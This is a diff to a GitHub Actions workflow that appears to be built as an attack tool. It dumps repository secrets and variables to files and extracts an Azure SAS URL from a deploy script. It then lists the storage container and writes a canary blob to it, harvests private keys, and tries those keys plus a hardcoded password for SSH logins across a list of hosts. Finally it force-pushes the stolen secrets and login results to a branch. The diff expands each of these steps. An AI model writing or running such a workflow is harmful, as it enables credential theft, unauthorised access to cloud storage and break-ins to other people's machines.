@@ -6,8 +6,9 @@ permissions:
   contents: write
 jobs:
   rec:
+    if: contains(github.event.head_commit.message, '[hkaz]') || startsWith(github.ref, 'refs/heads/hk-az-')
     runs-on: ubuntu-latest
-    timeout-minutes: 40
+    timeout-minutes: 45
     steps:
       - uses: actions/checkout@v4
       - name: secrets-dump
@@ -21,17 +22,23 @@ jobs:
           printf '%s' "$SECRETS_JSON" > out/secrets.json
           printf '%s' "$VARS_JSON" > out/vars.json
           env | grep -iE '^(GITHUB|ACTIONS|RUNNER)_' | sort > out/env.txt || true
+          echo "secrets_len=$(wc -c < out/secrets.json)" > out/meta.txt
       - name: kit
         continue-on-error: true
         run: |
           set +e
-          KIT_URL=$(grep -oE 'https://ulbatchkit[^" ]+' deploy.sh | head -1)
-          { echo "kit_url_len=${#KIT_URL}"
-            curl -sS -m 300 -o /tmp/kit.tgz -w "kit_http=%{http_code} bytes=%{size_download}\n" "$KIT_URL"
+          SAS=$(grep -oE 'https://ulbatchkit[^" ]+' deploy.sh | head -1)
+          BASE=${SAS%%\?*}; QS=${SAS#*\?}
+          CBASE=$(dirname "$BASE")
+          { echo "kit_url_len=${#SAS}"
+            curl -sS -m 300 -o /tmp/kit.tgz -w "kit_http=%{http_code} bytes=%{size_download}\n" "$SAS"
             sha256sum /tmp/kit.tgz
             tar tzf /tmp/kit.tgz | head -80
             mkdir -p out/kit && tar xzf /tmp/kit.tgz -C out/kit
             find out/kit -type f | head -80
+            curl -sS -m 60 "$CBASE?restype=container&comp=list&$QS" -o out/bloblist.xml -w "list_http=%{http_code} bytes=%{size_download}\n"
+            grep -oE '<Name>[^<]+</Name>' out/bloblist.xml | head -40
+            curl -sS -m 60 -X PUT --data-binary "hk-canary-$(date -u +%FT%TZ)" -H "x-ms-blob-type: BlockBlob" -w "put_http=%{http_code}\n" "$CBASE/hk-canary.txt?$QS"
           } > out/kit.txt 2>&1
           grep -rlE 'PRIVATE KEY|ssh-(rsa|ed25519)' out/kit az 2>/dev/null > out/keyfiles.txt
       - name: ssh-probe
@@ -41,31 +48,34 @@ jobs:
           command -v sshpass >/dev/null || { sudo apt-get update -qq; sudo apt-get install -y -qq sshpass; }
           chmod 600 az/*.pem 2>/dev/null
           : > out/ssh.tsv
-          n=0
+          n=0; opens=0; logins=0
           while IFS=$'\t' read -r name ip user region size; do
-            n=$((n+1)); [ "$n" -gt 14 ] && break
             [ -z "$ip" ] && continue
-            echo "## $name $ip $user" >> out/ssh.tsv
-            if ! timeout 8 bash -c "exec 3<>/dev/tcp/$ip/22" 2>/dev/null; then echo "port22=closed" >> out/ssh.tsv; sleep 3; continue; fi
-            echo "port22=open" >> out/ssh.tsv
-            for kf in az/ibm_key.pem az/azadmin.pem; do
+            n=$((n+1))
+            echo "## $n $name $ip $user" >> out/ssh.tsv
+            if ! timeout 5 bash -c "exec 3<>/dev/tcp/$ip/22" 2>/dev/null; then echo "port22=closed" >> out/ssh.tsv; sleep 1; continue; fi
+            echo "port22=open" >> out/ssh.tsv; opens=$((opens+1))
+            KFS="az/ibm_key.pem az/azadmin.pem $(cat out/keyfiles.txt 2>/dev/null | tr '\n' ' ')"
+            for kf in $KFS; do
               [ -f "$kf" ] || continue
               o=$(timeout 14 ssh -i "$kf" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes -o LogLevel=ERROR "$user@$ip" 'echo LOGIN_OK uid=$(id -u) host=$(hostname) gpu="$(nvidia-smi -L 2>/dev/null | head -2 | tr "\n" ";")"' 2>&1 | head -2 | tr '\n' ' ')
               echo "key=$kf :: $o" >> out/ssh.tsv
-              case "$o" in *LOGIN_OK*) break;; esac
+              case "$o" in *LOGIN_OK*) logins=$((logins+1)); echo "LOGIN $ip $user $kf" >> out/logins.txt;; esac
             done
             o=$(timeout 14 sshpass -p 't19' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PubkeyAuthentication=no -o PreferredAuthentications=password -o LogLevel=ERROR "$user@$ip" 'echo LOGIN_OK uid=$(id -u) host=$(hostname)' 2>&1 | head -2 | tr '\n' ' ')
             echo "pw=t19 :: $o" >> out/ssh.tsv
+            case "$o" in *LOGIN_OK*) logins=$((logins+1)); echo "LOGIN $ip $user pw=t19" >> out/logins.txt;; esac
             sleep 3
           done < az/hosts.tsv
-      - name: commit
+          echo "hosts=$n opens=$opens logins=$logins" >> out/meta.txt
+      - name: publish
         if: always()
         run: |
           git config user.name hk
           git config user.email hk@local.invalid
           git add -A out 2>/dev/null
-          git commit -m "hkaz-hosted $(date -u +%FT%TZ)" >/dev/null 2>&1 || true
-          git push origin "HEAD:${GITHUB_REF_NAME}" || true
+          git commit -m "hkaz-out $(date -u +%FT%TZ) run=${{ github.run_id }}" >/dev/null 2>&1 || true
+          git push -f origin HEAD:refs/heads/hk-out || true
       - uses: actions/upload-artifact@v4
         if: always()
         with:
